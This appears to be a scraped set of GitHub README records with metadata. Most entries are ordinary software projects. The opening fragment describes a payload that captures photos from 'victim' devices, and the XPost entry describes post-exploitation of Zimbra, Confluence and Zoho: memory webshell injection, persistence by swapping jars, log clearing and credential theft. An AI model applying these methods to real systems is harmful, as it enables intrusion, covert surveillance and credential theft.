`[+] Frp or Ngrok Server IP(default blank) >`
`[+] Frp or Ngrok Server Port(default blank)>`
`[+] Enable DingTalk Push?[./plugin/Nets3e/DingTalk.conf](y/n) >n`
`[+] Let the victim see their own photos?(y/n) >y`
`[+] What is the version of python you want to execute?([0]python [1]python3) >0`
`[+] What you need to do?([0]only generate payload [1]only start server [2]generate and start server [3]exit)0`

![alt text](./pic/Nets3e_Payload.png)



### Example


1.Customize and modify ./demo/Nets3e/Nets3e_demo.py to update the server IP and port for the S-Clustr.
2.Click Nets3e_demo_generate.bat to package it into an executable file.
3.Place the executable programs from `./device/output/Nets3e/Nets3eClient_debug.exe` and `./demo/Nets3e/Nets3e_demo.exe` into any folder of your choice.

![alt text](./pic/Nets3e_Ex.png)


`SHELL> ./Nets3e_demo.exe`



*Query Status*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 3`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 0`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/Nets3e_demo.png)

*Run Payload*

`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set pwr 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# set id 1`
`[S-H4CK13@S-Clustr]<3.0>@000C29EC84FE# run`

![alt text](./pic/Nets3e_RUN_1.png)

The directory ./plugin/Nets3e/IP_Photo contains photos of all devices.

Since we selected the option `Let the victim see their own photos? (y/n) > y`, the device will also see its own photo.


![alt text](./pic/Nets3e_RUN.png)

",2,0,1,0.0,"['security', 'update', 'announcement', 'vulnerability', 'detail', 'resolution', 'upgrade', 'instruction', 'overview', 'device', 'install', 'window', 'linux', 'core', 'concept', 'dual', 'key', 'authentication', 'constructing', 'pseudo', 'protocol', 'decentralized', 'distributed', 'control', 'ring', 'network', 'formation', 'overview', 'server', 'root', 'node', 'server', 'child', 'node', 'server', 'anonymous', 'client', 'init', 'retrieve', 'root', 'node', 'device', 'status', 'set', 'pwr', 'set', 'pwr', 'retrieve', 'child', 'node', 'status', 'enter', 'node', 'node', 'device', 'control', 'iot', 'wired', 'lan', 'control', 'arduino', 'wire', 'diagram', 'wireless', 'public', 'network', 'remote', 'control', 'arduino', 'wire', 'diagram', 'recommend', 'wire', 'diagram', 'flash', 'wire', 'diagram', 'wifi', 'wire', 'diagram', 'device', 'firmware', 'code', 'ot', 'siemens', 'it', 'plugin', 'hacker', 'voodoo', 'overview', 'rtmp', 'server', 'rtmp', 'payload', 'rtmp', 'stream', 'push', 'example', 'set', 'pwr', 'set', 'id', 'run', 'set', 'pwr', 'set', 'id', 'run', 'overview', 'server', 'payload', 'example', 'set', 'pwr', 'set', 'id', 'run', 'set', 'pwr', 'set', 'id', 'run']","['set', 'node', 'pwr', 'server', 'wire']",5.0,"[maven-shade-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,4.0,1.0
KirDemorgan/BeatSaberDsBot,master,"# BeatSaber Discord Bot

## Overview
This project is a Discord bot designed to integrate with the BeatSaber game, allowing users to fetch and display their BeatSaber statistics directly in Discord. The bot uses the ScoreSaber API to retrieve player data, including scores, ranks, and performance points (pp), and then assigns Discord roles based on the player's rank in the game.

## Features
- **Player Statistics**: Fetch and display individual player statistics from ScoreSaber.
- **Role Assignment**: Automatically assign roles in Discord based on the player's rank in BeatSaber.
- **Leaderboard**: Display global and country-specific leaderboards within Discord.

## Requirements
- Java 11 or higher
- Maven
- Discord Bot Token
- Access to ScoreSaber API

## Installation
1. Clone the repository:
   ```
   git clone https://github.com/KirDemorgan/BeatSaberDiscordBot.git
   ```
2. Navigate to the project directory:
   ```
   cd BeatSaberDiscordBot
   ```
3. Install dependencies using Maven:
   ```
   mvn install
   ```

## Usage
To start the bot, run:
```
java -jar target/BeatSaberDiscordBot-1.0-SNAPSHOT.jar
```
Make sure to set your Discord bot token and ScoreSaber API key in the `application.properties` file.

## Contributing
Contributions are welcome! Please follow the standard fork -> clone -> branch -> commit -> pull request workflow.



## Contact
KirDemorgan - [@KirDemorgan](https://github.com/KirDemorgan)

Project Link: [https://github.com/KirDemorgan/BeatSaberDiscordBot](https://github.com/KirDemorgan/BeatSaberDiscordBot)

",0,0,1,0.0,"['beatsaber', 'discord', 'bot', 'overview', 'feature', 'requirement', 'installation', 'usage', 'contribute', 'contact']","['beatsaber', 'discord', 'bot', 'overview', 'feature']",1.0,[],0.0,1.0,0.0
Rapter1990/rolepermissionexample,main,"# ROLE WITH PERMISSION THROUGH SPRING SECURITY IN SPRING BOOT

<p align=""center"">
    <img src=""screenshots/spring_boot_role_permission_main_image.png"" alt=""Main Information"" width=""700"" height=""500"">
</p>

### ğŸ“– Information

<ul style=""list-style-type:disc"">
  <li><b>This</b> is a Spring Boot example covering important and useful features.</li>
  <li>Here is an explanation of the example:</li>
       <ul>
         <li><b>Admin</b> and <b>User</b> implement their own <b>authentication</b> and <b>authorization</b> through their defined <b>role</b> names.</li>
         <li>The <b>Admin</b> handles with the following process shown above:
            <ul>
              <li><b>Admin</b> with <b>Role</b> containing <b>create</b> permission only handles with creating product</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>get</b> permission only handles with getting product by id</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>update</b> permission only handles with updating product by id</li>
              <li><b>Admin</b> with <b>Role</b> containing <b>delete</b> permission only handles with deleting product by id</li>
            </ul>
         </li>
         <li>The <b>User</b> handles with the following process shown above:
            <ul>
              <li><b>User</b> with <b>Role</b> containing <b>get</b> permission only handles with getting product by id</li>
            </ul>
         </li>
  </ul>
</ul>


### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/register</td>
      <td>User Register</td>
      <td>RegisterRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/login</td>
      <td>User Login</td>
      <td>LoginRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/refresh-token</td>
      <td>User Refresh Token</td>
      <td>TokenRefreshRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/authentication/user/logout</td>
      <td>User Logout</td>
      <td>TokenInvalidateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>POST</td>
      <td>/api/v1/products</td>
      <td>Create Product</td>
      <td>ProductCreateRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products/{productId}</td>
      <td>Get Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>GET</td>
      <td>/api/v1/products</td>
      <td>Get Products</td>
      <td>ProductPagingRequest</td>
      <td></td>
      <td></td>
      <td></td>
  <tr>
  <tr>
      <td>PUT</td>
      <td>/api/v1/products/{productId}</td>
      <td>Update Product By Id</td>
      <td>ProductUpdateRequest</td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
  <tr>
      <td>DELETE</td>
      <td>/api/v1/products/{productId}</td>
      <td>Delete Product By Id</td>
      <td></td>
      <td></td>
      <td>ProductId</td>
      <td></td>
  <tr>
</table>


### Technologies

---
- Java 21
- Spring Boot 3.0
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- TestContainer
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Postman
- Spring Boot Open Api


### Postman

```
Import postman collection under postman_collection folder
```

### Open Api

```
http://localhost:1225/swagger-ui/index.html
```

### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd rolepermissionexample
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd rolepermissionexample
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd rolepermissionexample
$ mvn clean install
$ mvn spring-boot:run
```

### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/2.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/3.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/4.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/5.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/6.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/7.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/8.PNG"">
</details>

### Contributors

- [Sercan Noyan GermiyanoÄŸlu](https://github.com/Rapter1990)",0,0,1,0.0,"['role', 'with', 'permission', 'through', 'spring', 'security', 'in', 'spring', 'boot', 'information', 'explore', 'rest', 'apis', 'technology', 'postman', 'open', 'api', 'prerequisite', 'define', 'variable', 'file', 'docker', 'run', 'maven', 'run', 'screenshots', 'contributor']","['spring', 'run', 'role', 'with', 'permission']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
wb04307201/easy-ai-spring-boot-starter,master,"# easy-ai-spring-boot-starter
# æ˜“æ™ºSpring

[![](https://jitpack.io/v/com.gitee.wb04307201/easy-ai-spring-boot-starter.svg)](https://jitpack.io/#com.gitee.wb04307201/easy-ai-spring-boot-starter)
[![star](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/star.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://gitee.com/wb04307201/easy-ai-spring-boot-starter/badge/fork.svg?theme=dark)](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)
[![star](https://img.shields.io/github/stars/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)
[![fork](https://img.shields.io/github/forks/wb04307201/easy-ai-spring-boot-starter)](https://github.com/wb04307201/easy-ai-spring-boot-starter)  
![MIT](https://img.shields.io/badge/License-Apache2.0-blue.svg) ![JDK](https://img.shields.io/badge/JDK-17+-green.svg) ![SpringBoot](https://img.shields.io/badge/Srping%20Boot-3+-green.svg)

> è¿™ä¸æ˜¯ä¸€ä¸ªAIå¤§æ¨¡å‹ï¼Œä½†æ˜¯å¯ä»¥å¸®ä½ å¿«é€Ÿé›†æˆAIå¤§æ¨¡å‹åˆ°Springé¡¹ç›®ä¸­ï¼Œ  
> å¹¶é€šè¿‡â€œæ£€ç´¢å¢å¼ºç”Ÿæˆ(RAG)â€çš„æ–¹å¼å»ºç«‹ä¸“å®¶çŸ¥è¯†åº“å¸®åŠ©å¤§æ¨¡å‹å›ç­”é—®é¢˜ã€‚  
> 
> æ ¸å¿ƒåŠŸèƒ½ä¾èµ–äº[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)å®ç°ï¼ŒRAGè¿è¡ŒåŸç†å¦‚ä¸‹  
> ![img_3.png](img_3.png)

## ä»£ç ç¤ºä¾‹
1. ä½¿ç”¨[æ˜“æ™ºSpring](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)å®ç°çš„[AIå¤§æ¨¡å‹Demo](https://gitee.com/wb04307201/easy-ai-demo)

## å¿«é€Ÿå¼€å§‹
### å¼•å…¥ä¾èµ–
å¢åŠ  JitPack ä»“åº“
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```
å¼•å…¥jar
```xml
<dependency>
    <groupId>com.github.wb04307201</groupId>
    <artifactId>easy-ai-spring-boot-starter</artifactId>
    <version>0.5.0</version>
</dependency>
```

### å®‰è£…å‘é‡æ•°æ®åº“
é€šè¿‡dockerå®‰è£…chromadbæ•°æ®åº“
```shell
docker run -d --name chromadb -p 8000:8000 chromadb/chroma
```

### å®‰è£…å¤§è¯­è¨€æ¨¡å‹
é»˜è®¤é€šè¿‡[ollama](https://ollama.com/)ä½¿ç”¨å¤§æ¨¡å‹ï¼Œä¸‹è½½å¹¶å®‰è£…
```shell
# æ‹‰å–llama3æ¨¡å‹
ollama pull llama3
# æ‹‰å–qwen2æ¨¡å‹
ollama pull qwen2
```

### æ·»åŠ ç›¸å…³é…ç½®
```yaml
spring:
  application:
    name: spring_ai_demo
  ai:
    ollama:
      chat:
        options:
          #  model: llama3
          model: qwen2
      embedding:
        options:
          model: llama3
      base-url: ""http://localhost:11434""
    vectorstore:
      chroma:
        client:
          host: http://localhost
          port: 8000
        store:
          collection-name: SpringAiCollection
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

### åœ¨å¯åŠ¨ç±»ä¸ŠåŠ ä¸Š`@EnableEasyAi`æ³¨è§£
```java
@EnableEasyAi
@SpringBootApplication
public class EasyAiDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(EasyAiDemoApplication.class, args);
    }

}
```

### ä½¿ç”¨å¤§æ¨¡å‹å¯¹è¯
å†…ç½®èŠå¤©ç•Œé¢http://ip:ç«¯å£/easy/ai/chat  
![img.png](img.png)

### ä½¿ç”¨ä¸“å®¶çŸ¥è¯†åº“çš„å¤§æ¨¡å‹å¯¹è¯
å†…ç½®ä¸Šä¼ ç•Œé¢http://ip:ç«¯å£/easy/ai/list  
![img_1.png](img_1.png)
çŠ¶æ€åˆ—æ˜¾ç¤ºâ€œå‘é‡å­˜å‚¨å®Œâ€å³æ–‡æ¡£å·²è½¬å…¥çŸ¥è¯†åº“  
å†…ç½®èŠå¤©ç•Œé¢http://ip:ç«¯å£/easy/ai/chat  
![img_2.png](img_2.png)

## é«˜çº§
### ä½¿ç”¨å¤§æ¨¡å‹API
è¿™é‡Œä»¥[æ™ºè°±AI](https://open.bigmodel.cn/)ä¸ºä¾‹ï¼Œå¦‚ä½•å¯¹æ¥å¤§æ¨¡å‹API  
ä¿®æ”¹é¡¹ç›®ä¾èµ–ï¼Œæ”¯æŒçš„å¤§æ¨¡å‹å¹³å°å¯åˆ°[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)æŸ¥çœ‹  
```xml
        <dependency>
            <groupId>com.gitee.wb04307201</groupId>
            <artifactId>easy-ai-spring-boot-starter</artifactId>
            <version>0.5.0</version>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.ai</groupId>
                    <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.springframework.ai</groupId>
            <artifactId>spring-ai-zhipuai-spring-boot-starter</artifactId>
            <version>1.0.0-SNAPSHOT</version>
        </dependency>
```
ä¿®æ”¹é…ç½®é¡¹ç›®
```yaml
spring:
  ai:
    zhipuai:
      api-key: æ™ºè°±AI API Key
```
> é™¤äº†å¤§æ¨¡å‹APIå¤–ï¼Œå‘é‡æ•°æ®åº“ä¹Ÿå¯ä»¥å‚ç…§ä¸Šé¢çš„æ–¹å¼è¿›è¡Œæ›¿æ¢",0,0,2,0.0,"['model', 'enableeasyai']","['model', 'enableeasyai']",1.0,[],0.0,1.0,0.0
0linlin0/XPost,main,"ï»¿# What it does

A post-exploitation tool tailored for high-value systems, designed to assist in real attack penetration, achieving more comprehensive, covert, and long-term post-exploitation information gathering, as well as lateral movement penetration.

# User

Red team attack and defense personnel.

# Application-oriented

email servers, gateway devices, documents, enterprise knowledge management and collaboration platforms, single sign-on platforms, defect tracking platforms, IT operations management software, domain management team building, code repository management, etc.

# What the capabilitie

Including but not limited toï¼šemail retrieval, plaintext password recording, operations data acquisition, obtaining arbitrary login credentials under unknown passwords, domain controller information retrieval, single sign-on hijacking, and trace cleaning operations.

# Advantages

The data callback traffic achieves traffic concealment
stealth persistence, fileless landing
after server rebooting or patch updates, the backdoor remains undetectable.

# Currently Supported Applications

zimbraã€confluenceã€zoho

# Usage Methods and Scenarios

1.The tool relies on the Godzilla Webshell management tool, deployed in the form of plugins. Godzilla download link: https://github.com/BeichenDream/Godzilla

2.After successfully obtaining access to the target system, in most scenarios, permissions are gained through remote attacks exploiting vulnerabilities. It's also possible to gain access to target permissions through other means. Regardless of the method, we need an environment where code can be executed. We implant a memory-based webshell successfully into the memory and use the webshell as a loader to further execute functions (payloads) present in other tools in memory, obtaining the desired data and performing other operations.
When the vulnerability itself supports code execution, such as the confluenceCVE-2023-22527 template injection vulnerability, we directly inject a memory-based webshell by optimizing the exploit.
When the vulnerability type involves file upload or command execution, refer to the following methods for injecting a memory-based webshell.

# Core Overview of Functional Implementation Technologies

The topic discussed the post-exploitation research on high-value systems such as email servers, gateway devices, documents, enterprise knowledge management and collaboration platforms, single sign-on platforms, defect tracking platforms, IT operations management software, domain management team building, code repository management, etc.Targeting various applications, it was achieved by deploying highly covert plugins and leveraging deprecated functionalities to hijack the runtime web container request processing logic and implant highly concealed persistent backdoors in memory. These memory-implanted backdoors serve as loaders to execute effective payloads directly in memory, with both the backdoor code logic and functional payloads operating within memory.
In-depth analysis of the code logic for different applications led to the exploration of solutions for challenges encountered during the runtime execution of payloads in memory. These challenges included multiple class loader loading, bypassing system file verification protection, and context decoupling for functional code extraction, among other issues.
The implementation enabled the execution of effective payloads in memory without initiating additional network requests to the target or writing files to disk. This allowed for the covert execution of payloads in memory under highly concealed attack scenarios, facilitating the extraction of high-value system information, such as email retrieval, plaintext password recording, operations data acquisition, obtaining arbitrary login credentials under unknown passwords, domain controller information retrieval, single sign-on hijacking, and trace cleaning operations.
Subsequently, existing web shell management tools were utilized to encrypt and transmit data, achieving traffic-side concealment. This approach aims to achieve a more comprehensive, covert, and long-term post-exploitation information gathering and deep penetration in real-world attack scenarios.

## Zimbra

**1. Upload the 'injec.jsp' file to the target system's** 

upload directory : /opt/zimbra/jetty\_base/webapps/zimbra/public/

**2.Access 'inject.jsp' to inject a memory backdoor into the system. After injecting, delete 'inject.jsp,' but the backdoor will still persist.**

![å›¾ç‰‡](./XPost-ReadMe/images/1.png)

Successfully removed 'inject.jsp' and established a connection to the memory backdoor.

![å›¾ç‰‡](./XPost-ReadMe/images/22.png)

**3.Backdoor Persistence**

Prevent the memory-resident backdoor from being cleared upon restart by replacing the zimbra-license.jar plugin. Substitute the malicious zimbra-license-success.jar for the original system jar file to achieve backdoor persistence.

![å›¾ç‰‡](./XPost-ReadMe/images/3.png)

**4.Clearing logs**

Utilize the 'zimbraplugin ClearLog' function to erase logs of malicious JSP access.

![å›¾ç‰‡](./XPost-ReadMe/images/4.png)

**5.Functional payload**

Utilize specific functionalities as needed. Upon clicking the corresponding function, the payload will be sent to the server backdoor, and the corresponding payload will be executed in memory.

![å›¾ç‰‡](./XPost-ReadMe/images/5.png)

**6.Traffic**

![å›¾ç‰‡](./XPost-ReadMe/images/6.png)

**7.Test Version**

9\.0.0\_GA\_4583

## Zoho

**1.Upload shell.jar to inject a backdoor into the target system at runtime**

![å›¾ç‰‡](./XPost-ReadMe/images/7.png)

The backdoor has been successfully injected; delete shell.jar.

**2.Backdoor Persistence**

To prevent the loss of the backdoor upon system restart, modify the startup logic by replacing AdventnetADSMStartUp.jar.

**3.Functional payload**

![å›¾ç‰‡](./XPost-ReadMe/images/8.png)

**4.Traffic**

![å›¾ç‰‡](./XPost-ReadMe/images/9.png)

**5.Test Version**

ManageEngine\_ADManager\_Plus\_7222\_64

## Confluence

**1. Upload inject.jsp to inject a memory backdoor.**

Upload path: /opt/atlassian/confluence/synchrony-proxy/

**2.Access inject.jsp to inject a memory backdoor.**

![å›¾ç‰‡](./XPost-ReadMe/images/10.png)

After successfully injecting the backdoor, delete inject.jsp.

**3.Functional payload**

![å›¾ç‰‡](./XPost-ReadMe/images/11.png)

**4.Traffic**

![å›¾ç‰‡](./XPost-ReadMe/images/12.png)

**5.Test Version**

![å›¾ç‰‡](./XPost-ReadMe/images/13.png)
",0,0,1,0.0,"['what', 'user', 'what', 'capabilitie', 'advantage', 'currently', 'support', 'application', 'usage', 'method', 'scenario', 'core', 'overview', 'functional', 'implementation', 'technology', 'zimbra', 'zoho', 'confluence']","['what', 'user', 'capabilitie', 'advantage', 'currently']",1.0,[],0.0,1.0,0.0
aws-samples/real-time-social-media-analytics-with-generative-ai,main,"# Uncover Social Media Insights in Real Time using Amazon Managed Service for Apache Flink and Amazon Bedrock

In this AWS Sample you will deploy an AWS Architecure that is able to combine streaming data with GenAI using Amazon Managed Service for Apache Flink and Amazon Bedrock

## Architecture

![Social Media Insights with Apache Flink and Amazon Bedrock](diagrams-screenshots/aws-architecture.png ""Social Media Insights with Apache Flink and Amazon Bedrock"")

## Solution Description

1.	User logs in using Amazon Cognito User. Cognito will be used to authenticate all API Gateway Calls
2.  User inputs using the front-end application, hosted locally developed using Streamlit framework, the query terms, API Key and frequency of requests to be made to the X - Twitter API in a Streamlit front end UI. We also provide a front-end of a Kinesis Social Media Application where you can also send messages to be processed in case of not having a Twitter Developer Account
2.	Amazon Managed Service for Apache Flink is used to consume and process the tweets in real time and stores in state the parameters for making the API requests received from the front-end application
3.	The streaming application using Flinkâ€™s Asynchronous Async I/O invokes Amazon Titan Embeddings Model hosted by Amazon Bedrock to embed the tweets.
4.	Amazon Bedrock responds with the embeddings of the tweets
5.	The Apache Flink application then writes the embeddings and original text of the message into an Amazon OpenSearch Index. We will be using two separate indexes to separate the messages coming from the X source, and the messages being ingested from the Kinesis Social Media App
6.	User makes questions using the front-end application in Streamlit
7.	An AWS Lambda Function is triggered by Amazon API Gateway with the query from the user.
8.	The Lambda function using LangChain, invokes Amazon Titan Embeddings model to embed the question
9.	Amazon Bedrock returns the embedded question
10.	The Lambda function using LangChain, does a semantic search in Amazon OpenSearch and retrieves the relevant documents related to the question.
11.	Amazon Opensearch returns to the AWS Lambda function, the relevant documents with the vectors for answering the question.
12.	The Lambda Function using LangChain, Prompt Engineering, provides the question and relevant vectors for answering the question to Anthropic Claude hosted on Amazon Bedrock
13.	Amazon Bedrock returns the answer to the question to the Lambda function
14.	The response is delivered to API Gateway
15.	API Gateway provides the response to the questions of the user in the Streamlit application

## Getting started

### Pre-requisites

To implement this AWS Sample, you need to have the following in your local environment:

-	If you want to pull data from X (Twitter), you will need a Twitter Developer Account with at least Basic Tier, in order to use the Search Tweet API. If not, you will be able to process custom messages you send through an UI
-	Download Python 3.11.9 or later
-   Download and install Node.js 14.15.0 or later
-	Download and install Typescript 3.8 or later 
  `npm install -g typescript`
-	Download and install Git
-	Download and install AWS CDK CLI
  `npm install -g aws-cdk`
-	Download and install Maven 
-	Download and install Streamlit
  `pip install streamlit==1.30.0`
-   Download CognitoAuthenticator
  `pip install streamlit-cognito-auth`

You will also need to request GenAI Models access for Amazon Titan Embeddings Model and Anthropic Claude Foundation Models on Amazon Bedrock

Follow the instructions in order to request the models:


1.	Go to the Amazon Bedrock Console, by searching Amazon Bedrock, and click on the service

![Amazon Bedrock console](diagrams-screenshots/bedrock-console.png ""Amazon Bedrock console"")

2.	Click Get Started

![Amazon Bedrock console](diagrams-screenshots/bedrock-console2.png ""Amazon Bedrock console"")

3.	Go to Model Access in the bottom left Menu

![Amazon Bedrock model access](diagrams-screenshots/bedrock-model-access.png ""Amazon Bedrock model access"")

4.	Click Manage model access

![Amazon Bedrock model access](diagrams-screenshots/bedrock-model-access2.png ""Amazon Bedrock model access"")

5.	Select within Amazon
a.	Titan Embeddings G1 â€“ Text
6.	Select within Anthropic
a.	Claude 3 Haiku

![Claude Instant model](diagrams-screenshots/claude-haiku-model.png ""Claude Instant model"")

7.	Go to the bottom and click Request model access

![Request Claude Instant model](diagrams-screenshots/request-model-access.png ""Request Claude Instant model"")

8.	It may take several minutes to get access to the models, but we can continue with the solution deployment

![Wait for model availability](diagrams-screenshots/wait-for-model-availability.png ""Wait for model availability"")

### Use CDK to create and deploy the solution stack

We use AWS CDK CLI to deploy the Solution. The CDK will deploy the following:
-   Amazon Cognito User Pool, App Client and User
-	Kinesis Data Streams for receiving rules for pulling data from Twitter API
-	Kinesis Data Streams for receiving user generated messages from StreamLit Application
-	Amazon API Gateway to send events to Rules Kinesis Data Streams
-	Amazon API Gateway to send custom messages to Kinesis Data Streams
-	Amazon OpenSearch for Vector Database
-   AWS Lambda Function for creating indexes in Amazon OpenSearch
-	AWS Lambda Function with LangChain for invoking Amazon Bedrock and do semantic Search in Opensearch
-	Amazon API Gateway for invoking the Lambda Function.
-	Amazon Managed Service for Apache Flink, for processing the tweets and invoking Amazon Bedrock to do the Embeddings.
-   AWS Lambda to start Managed Flink Application

1. Git Clone the repository

```shell
git clone <repo>
```

1. CD into repo

```shell
cd real-time-social-media-analytics-with-generative-ai
```

3. Install libraries

```shell
npm install
```

4. CD into the Apache Flink Application folder

```shell
cd flink-bedrock
```

5. Build the Apache Flink Application

```shell
mvn clean package
```

6. Go back to the root folder of the directory

```shell
cd ..
```

> If you want to make any changes to the username and passwords used for Amazon Cognito and Amazon OpenSearch, you can do so by modifying the const at the beginning the cdk stack at *lib/real-time-social-media-analytics-gen-ai.ts*

7. Bootstrap your AWS environment
```shell
cdk bootstrap
```
8. Deploy the AWS Architecture
```shell
cdk deploy
```
9. When asked answer yes to confirm the deployment. The deployment will take around 10 minutes.
10.	After deployment has finished, please go to AWS CloudFormation

![AWS Cloudformation](diagrams-screenshots/cloudformation.png ""AWS Cloudformation"")

11.	Go to Stacks
12.	Select RealTimeSocialMediaAnalyticsGenAi
13.	Go to Outputs
14.	You will need to copy the **StreamlitCommand**, which we will use for later

![AWS Cloudformation Output](diagrams-screenshots/cloudformation-output.png ""AWS Cloudformation Output"")

As part of the deployment, two AWS Lambda Functions have been created and deployed in order to start the Managed Flink Application and create the two indexes in OpenSearch
The two indexes are:

```
PUT /twitter-custom-rag-index
{
  ""mappings"": {
    ""properties"": {
      ""embeddings"": {
        ""type"": ""knn_vector"",
        ""dimension"": 1536,
        ""method"": {
          ""name"": ""hnsw"",
          ""space_type"": ""l2"",
          ""engine"": ""nmslib"",
          ""parameters"": {
            ""ef_construction"": 128,
            ""m"": 24
          }
        }
      },
      ""@timestamp"": {
        ""type"": ""date""
      },
      ""text"": {
        ""type"": ""text""
      }
    }
  },
  ""settings"": {
    ""index"": {
      ""knn"": true,
      ""number_of_shards"": ""5"",
      ""number_of_replicas"": ""1""
    }
  }
}
```

```
PUT /twitter-rag-index
{
  ""aliases"": {},
  ""mappings"": {
    ""properties"": {
      ""@timestamp"": {
        ""type"": ""date""
      },
      ""embeddings"": {
        ""type"": ""knn_vector"",
        ""dimension"": 1536,
        ""method"": {
          ""engine"": ""nmslib"",
          ""space_type"": ""l2"",
          ""name"": ""hnsw"",
          ""parameters"": {
            ""ef_construction"": 128,
            ""m"": 24
          }
        }
      },
      ""impression_count"": {
        ""type"": ""integer""
      },
      ""likes"": {
        ""type"": ""integer""
      },
      ""retweet_count"": {
        ""type"": ""integer""
      },
      ""tweet"": {
        ""type"": ""text""
      }
    }
  },
  ""settings"": {
    ""index"": {
      ""knn"": true,
      ""number_of_shards"": ""5"",
      ""number_of_replicas"": ""1""
    }
  }
}
```

With these steps we have configured the Data Ingestion part of the solution, we will now continue in setting up the User Interface.

### Streamlit Application

1. In the project repository, cd into the streamlit folder

```shell
cd streamlit
```

In that folder you will find a Multi-Page Streamlit Application
-	One for configuring the Flink Application for filtering the tweets to process
-	Another for sending custom messages if you do not have a Twitter Developer Account.
2. We will start the Streamlit Application UI, for which you will need to use the command you copied from the CloudFormation Outputs

It follows this pattern
```shell
streamlit run Bedrock_Chatbot.py --theme.base ""dark"" -- --pool_id <pool_id> --app_client_id <app_client_id> --app_client_secret <app_client_secret>  --bedrockApi <value> --rulesApi <value> --kinesisAPI <value>
```

This will open a tab in your browser. This is how we will be able to interact with our Flink Application and make questions related to the processed messages

4. You will need to authenticate with the Cognito user that has been created during the CDK Deployment

If you did not make any change to the CDK, the Cognito user created for you is: 

* Username: FlinkGenAIBedrock@example.com,
* Password: FlinkGenAIBedrock2024!

> You can create additional users in Amazon Cognito and delete this one if needed

![Cognito-auth](diagrams-screenshots/cognito-auth.png ""cognito-auth"")


3. If you are going to be using the Twitter API you will need to provide the following:

- Twitter Bearer Token
- Query term for the Search API (For ex. Amazon Bedrock)
- Time between requests (Basic Tier of Twitter API only allows us to pull data every 15 seconds with a maximum of 10000 Tweets per month). If you select a frequency below 15 seconds it wonâ€™t accept the input as we donâ€™t want the API to be throttled. This can be modified in the Flink Application Code.

![Streamlit application configuration](diagrams-screenshots/streamlit-app1.png ""Streamlit application configuration"")

4. Once you have entered those configurations, we are ready to start making questions related to Twitter Feed.  Please check the Use Twitter Index Box. If we donâ€™t, we will be making questions to the Kinesis Social Media messages

For example, we will make the following questions

â€¢	Based on the tweets, what are the main topics people are discussing?

![Streamlit application](diagrams-screenshots/streamlit-app2.png ""Streamlit application"")

â€¢	Which are the most asked product feature requests in AWS?

![Streamlit application](diagrams-screenshots/streamlit-app3.png ""Streamlit application"")

5. If you do not plan to use the Twitter API, you send messages using the My Social Media. For example:

![Streamlit application](diagrams-screenshots/streamlit-app4.png ""Streamlit application"")

If we go back to Bedrock Chatbot, we can make questions on messages we sent to My Social Media. Note â€œUse Twitter Indexâ€ box must be unchecked.

â€¢	Is there any tweet mentioning Mistral?

![Streamlit application](diagrams-screenshots/streamlit-app5.png ""Streamlit application"")

